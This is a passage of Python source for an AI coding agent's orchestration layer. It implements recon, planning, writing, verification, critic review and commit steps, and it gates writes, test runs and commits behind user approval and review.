            return "recon needs a task saying what to find out."
        self.service._log(self.goal_id, None, "info", f"conductor sent the librarian: {task}")
        try:
            async with self.service._stage(self.goal_id, "librarian", "librarian") as lib_stage:
                evidence = await self.service._librarian(self.goal_id, self.goal, self.ws, task=task)
                lib_stage.record("incomplete" if evidence.get("capped") else "pack")
        except (AgentOutputInvalid, ProviderError, ValueError) as exc:
            return (
                f"The librarian could not run ({getattr(exc, 'code', 'error')}: "
                f"{exc}). You may plan without evidence, but say in your answer "
                "that the workspace was not looked at."
            )
        return self.service._evidence_text(evidence)

    async def design(self, args: dict[str, Any]) -> str:
        task = str(args.get("task") or "").strip()
        if not task:
            return "design needs a task saying what direction to lock."
        evidence = self.service._evidence_for(self.goal_id)
        if not evidence:
            return (
                "There is no evidence for the designer to decide from. Call "
                "`recon` first, then `design`."
            )
        try:
            async with self.service._stage(self.goal_id, "design", "design") as design_stage:
                locked = await self.service._design(self.goal_id, self.goal, self.ws, evidence, task=task)
                design_stage.record("contract" if locked else "declined")
        except (AgentOutputInvalid, ProviderError, ValueError) as exc:
            return (
                f"The designer could not run ({getattr(exc, 'code', 'error')}: "
                f"{exc}). Plan without a locked direction, and say so."
            )
        if not locked:
            return "The designer declined to lock a direction for this request."
        return self.service._design_text(locked)

    async def plan(self, args: dict[str, Any]) -> str:
        task = str(args.get("task") or "").strip()
        existing = self.service.goals.steps(self.goal_id)
        if existing:
            return (
                f"This goal already has a plan ({len(existing)} step"
                f"{'s' if len(existing) != 1 else ''}: {', '.join(s.title for s in existing)}). "
                "Do not plan twice: tell the user what the steps are and stop."
            )
        evidence = self.service._evidence_for(self.goal_id)
        if not evidence:
            # The one guard that has to stay in code rather than in the
            # prompt: a plan written against a guessed file layout edits the
            # wrong files, and telling a model to recon first does not stop a
            # model that has decided it already knows.
            return (
                "There is no evidence yet, and a plan built on a guess edits "
                "the wrong files. Call `recon` first, then call `plan` again."
            )
        try:
            # `fail_goal=False`: the recipe's planner ends the goal when it cannot plan, because nothing
            # after it can run. Here it is one move among several. A failed plan used to mark the goal
            # FAILED and then return as though it had worked (status FAILED, no steps, "the plan is waiting
            # for the user to approve it"), and the turn's own final COMPLETED then raised.
            await self.service._plan_steps(
                self.goal_id, self.goal, self.ws, evidence, self.service._design_for(self.goal_id),
                task=task or None, fail_goal=False,
            )
        except (AgentOutputInvalid, ProviderError, ValueError) as exc:
            return (
                f"Planning failed ({getattr(exc, 'code', 'error')}: {exc}). "
                "Nothing was written and the goal is not planned. You may call `plan` again with a "
                "narrower task, or tell the user plainly that it could not be planned."
            )
        refreshed = self.service.goals.get(self.goal_id)
        steps = self.service.goals.steps(self.goal_id)
        return json.dumps({
            "status": refreshed.status,
            "steps": [
                {
                    "step_id": s.id, "title": s.title, "order": s.ordinal,
                    "description": s.description, "suggested_paths": list(s.suggested_paths or []),
                }
                for s in steps
            ],
            "note": (
                "The plan is waiting for the user to approve it. Nothing has "
                "been written and nothing can be until they start it. Tell "
                "them what the steps are and stop."
            ),
        }, default=str)

    async def write(self, args: dict[str, Any]) -> str:
        step_id = str(args.get("step_id") or "").strip()
        instructions = str(args.get("instructions") or "").strip()
        step = self.step_for(step_id)
        if isinstance(step, str):
            return step
        allowed, why = self.service._write_allowed(self.goal_id)
        if not allowed:
            return why
        if step.status == "COMPLETED":
            return (
                "That step is already complete and committed. Writing to it again would change files "
                "its commit already recorded. If something is wrong with it, say so to the user instead."
            )
        if not instructions:
            return "write needs instructions: what should change."
        state = self._state_of(step.id)
        if self.goal.dry_run and state.files:
            return (
                "This goal is a dry run, and a dry run keeps one stored proposal per step: a second "
                "`write` would replace the proposal for the files already written. Call `verify` on what "
                "you have, or say to the user what else the step needs."
            )
        fs = FileSystemService(self.ws.root_path)
        try:
            async with self.service._stage(self.goal_id, "fixer", "fixer", step.id) as fix_stage:
                summaries, wants_pass = await self.service._fixer(
                    self.goal_id, step, fs, self.goal.dry_run, self.service._evidence_for(self.goal_id),
                    guidance=instructions,
                )
                changed = [s for s in summaries if s.get("changed", True)]
                fix_stage.record("wrote" if changed else "no_change")
        except WriteWithdrawn as exc:
            return str(exc)
        except (AgentOutputInvalid, ProviderError, PathEscapeError) as exc:
            return (
                f"The fixer failed on that step ({getattr(exc, 'code', 'error')}: "
                f"{exc}). Nothing further was written for it."
            )
        state.wrote(summaries)
        if self.goal.dry_run:
            note = "This was a dry run: the files were proposed, not written. "
        elif wants_pass:
            # The recipe grants these passes itself. Here the conductor decides, so it is told instead of
            # the flag being dropped: running tests against half-written work is a run wasted.
            note = (
                "The fixer says this change is not finished: it asked for another pass. Call `write` "
                "again for the next part before `verify`."
            )
        else:
            note = (
                "Call `verify` next: a change that has not been run is one "
                "nobody has seen work."
            )
        return json.dumps({
            "step_id": step.id,
            "changed": [
                {
                    "path": s.get("path"), "op": s.get("op", "write"),
                    "diff": _excerpt(str(s.get("unified_diff") or "")),
                }
                for s in summaries if s.get("changed", True)
            ],
            "dry_run": bool(self.goal.dry_run),
            "needs_another_pass": bool(wants_pass),
            "note": note,
        }, default=str)

    async def verify(self, args: dict[str, Any]) -> str:
        step_id = str(args.get("step_id") or "").strip()
        step = self.step_for(step_id)
        if isinstance(step, str):
            return step
        state = self._state_of(step.id)
        if not state.files:
            return (
                "Nothing has been written for that step in this run. Call "
                "`write` first — verification is meant to judge a change, "
                "and there is none."
            )
        # `write` and `run_command` read the goal's stored status; so does this. Verification runs the project's own
        # tests (`pytest` imports every conftest.py, `npm run` runs any script), which is what an approved plan
        # allows and Pause, a critic's request for changes, Cancel and a failure all take back. The step's files are
        # what a conductor holds after any of those (it wrote them while the goal was running, or they were recovered
        # from the log), so having them is not the same as being allowed to run anything.
        approved, _ = self.service._write_allowed(self.goal_id)
        if not approved:
            return (
                "Nothing was run. `verify` runs this project's own tests, and only an approved plan that is "
                "running may do that; this goal is paused, not yet approved, plan-only, or over. A paused goal is "
                "resumed only by the user, with Start. Tell them what is waiting for them and stop."
            )
        try:
            async with self.service._stage(self.goal_id, "verifier", "verifier", step.id) as v:
                outcome = await self.service._verifier(
                    self.goal_id, step, self.ws, self.service._evidence_for(self.goal_id),
                    diffs=state.summaries(),
                )
                v.record(_verifier_outcome(outcome))
        except TestsFailed as exc:
            # The verifier's own contract: a failed run is the verdict, and
            # it raises it as control flow inside `run_step`. Here it is a
            # value, because the conductor is the thing that decides what to
            # do about a failure — retry, re-plan, or report it.
            outcome = self.service._last_test_result(self.goal_id, step.id)
            state.test = outcome
            state.test_failed = True
            state.reviewed = False
            return "Verification FAILED. " + json.dumps({
                "reason": str(exc), "outcome": outcome,
            }, default=str)
        except (AgentOutputInvalid, ProviderError) as exc:
            return (
                f"The verifier could not run ({getattr(exc, 'code', 'error')}: "
                f"{exc}). This step is unverified."
            )
        state.test = outcome
        state.test_failed = False
        return json.dumps({"passed": True, "outcome": outcome}, default=str)

    async def review(self, args: dict[str, Any]) -> str:
        step_id = str(args.get("step_id") or "").strip()
        step = self.step_for(step_id)
        if isinstance(step, str):
            return step
        state = self._state_of(step.id)
        if not state.files:
            return (
                "There is nothing to review for that step: it has not been "
                "written in this run. Call `write` first."
            )
        if state.test_failed:
            return (
                "That step's verification failed, and a review of code whose tests fail is not a review. "
                "Take the failure back to `write`, then `verify` again."
            )
        # Only a verdict reached in this run, for the files as they are *now*. The last `test_result` in the
        # event log used to stand in when there was none, which is the verdict of whatever was written
        # before the most recent `write`.
        verdict = (state.test or {}).get("verdict")
        if state.test is None or verdict not in ("pass", "skip"):
            return (
                "That step has no test verdict for its current files, and a review without one "
                "cannot tell working code from broken code. Call `verify` first."
            )
        fs = FileSystemService(self.ws.root_path)
        try:
            async with self.service._stage(self.goal_id, "critic", "critic", step.id) as c:
                await self.service._critic(
                    self.goal_id, step, fs, state.summaries(), self.service._evidence_for(self.goal_id),
                    state.test, ws_root=self.ws.root_path,
                )
                c.record("approve")
        except CriticRejection as exc:
            # Recorded here because the stage block above never reaches its
            # `record` on this path, and a critic that asked for changes is
            # the one outcome a reader most needs to see.
            self.service.goals.publish(self.service._event(
                self.goal_id, step.id, "stage_result",
                {
                    "stage": "critic", "role": "critic", "ordinal": 0,
                    "outcome": "request_changes", "detail": str(exc),
                    "duration_ms": 0, "tokens": 0, "calls": 0,
                },
            ))
            state.reviewed = False
            reasons = "\n".join(f"{i}. {r}" for i, r in enumerate(exc.reasons, 1))
            return (
                "The critic asked for changes and did not approve this step. Its reasons:\n"
                f"{reasons}\n\n"
                "The goal is now paused: a critic's request for changes stops the run so the user can read "
                "it, and only the user resumes it, with Start. `write` will be refused until then. Tell "
                "the user these reasons, plainly, and stop."
            )
        state.reviewed = True
        return "The critic approved this step. Call `summarize` to record and commit it."

    async def summarize(self, args: dict[str, Any]) -> str:
        step_id = str(args.get("step_id") or "").strip()
        step = self.step_for(step_id)
        if isinstance(step, str):
            return step
        state = self._state_of(step.id)
        if not state.files:
            return "That step was not written in this run, so there is nothing to record."
        if not state.reviewed:
            # Not a formality. The commit is the point of no return for a
            # step, and the review is the only thing standing between a
            # model's opinion of its own work and the user's git history.
            return (
                "That step has not been reviewed. Call `review` first, and "
                "commit it only if the critic approved."
            )
        scribed = ""
        try:
            async with self.service._stage(self.goal_id, "scribe", "scribe", step.id) as s:
                scribed = await self.service._scribe(
                    self.goal_id, step, state.summaries(), self.ws.root_path, self.goal.dry_run, state.test,
                )
                s.record(scribed)
        except (AgentOutputInvalid, ProviderError) as exc:
            return f"The scribe could not record that step ({exc})."
        if scribed == "cancelled":
            # The scribe stopped before committing because the goal was cancelled. The step is not done, and
            # saying it was recorded and committed would be the one claim here that is false.
            return (
                "The goal was cancelled before the commit, so nothing was committed and the step is not "
                "complete."
            )
        self.service._set_step(self.goal_id, step, "COMPLETED")
        return {
            "committed": "That step is recorded and committed.",
            "nothing_to_commit": (
                "That step is recorded, but git had nothing to commit: its files match the last commit, "
                "or git refused (the log says which)."
            ),
            "not_a_repo": (
                "That step is recorded, but this folder is not a git repository, so nothing was "
                "committed; the change is on disk."
            ),
            "skipped": "That step is recorded as a dry run: nothing was written or committed.",
        }.get(scribed, f"That step is recorded ({scribed}).")

    async def todo(self, args: dict[str, Any]) -> str:
        """The conductor's note to its next run: add, start, finish or drop an item, or read the list back.

        Not a capability. The list is advice to the model that wrote it and nothing in the engine reads it to
        decide anything: it cannot approve a step, complete one, widen a command or reach `write`. It is read
        from the goal's newest `todo_updated` event on every call rather than held, so two runs can never
        overwrite each other with a stale copy, and a change is published as a whole snapshot.

        A refused change returns the reason and publishes nothing, and does not use up the run's edits: a
        model that keeps mistyping an id is bounded by its call budget, and spending the edit limit on
        refusals would lock a run out of a list it never changed.
        """
        todos = self.service._todos_for(self.goal_id)
        action = str(args.get("action") or "").strip().lower()
        if action == "list":
            return todos.render()
        if self.todo_edits >= MAX_MUTATIONS:
            return (
                f"This run has already changed the todo list {MAX_MUTATIONS} times, which is the limit. "
                "Leave it as it is and get on with the step."
            )
        try:
            note = todos.change(action, text=args.get("text"), item_id=args.get("id"))
        except TodoRefused as refusal:
            return str(refusal)
        self.todo_edits += 1
        self.service._publish_todos(self.goal_id, todos)
        return f"{note}\n{todos.render()}"

    async def ask_user(self, args: dict[str, Any]) -> str:
        """Put one question to the person, and end the run.

        Not a capability: it cannot approve a plan, write or run anything, and the answer is the person's next
        message, an ordinary turn through the one door that creates turns (docs/00 §6.8). The menu does not
        offer it while the goal is `RUNNING` or once a plan exists, and this refuses too, reading the stored
        rows like `write`: a run carrying out a step the person approved has nobody there to answer and must
        end finished or paused with a reason, and a plan is itself what the person is asked to answer.

        A question the engine will not put (none, too long, one option) is a sentence back and the run goes on.
        """
        if self.service.goals.get(self.goal_id).status == "RUNNING":
            return (
                "There is nobody to answer while an approved plan is running, so `ask_user` is not available "
                "now. Finish the step, or stop and say plainly what you need; the run will pause and tell "
                "the person."
            )
        if self.service.goals.steps(self.goal_id):
            return (
                "There is a plan now, and the plan is what the person is looking at: they approve it, edit "
                "it, or say what to change. `ask_user` is for what you need before you can plan. Stop and "
                "say in a sentence what the plan assumes."
            )
        try:
            question = parse_question(args)
        except AskRefused as refusal:
            return str(refusal)
        raise EndTurn(question.prose(), question.to_payload())


def _excerpt(text: str, limit: int = _DIFF_EXCERPT_CHARS) -> str:
    """The head of a diff, with a count of what was left out, so a cut is never mistaken for the whole."""
    if len(text) <= limit:
        return text
    return f"{text[:limit]}\n…[{len(text) - limit} more characters of this diff not shown]"
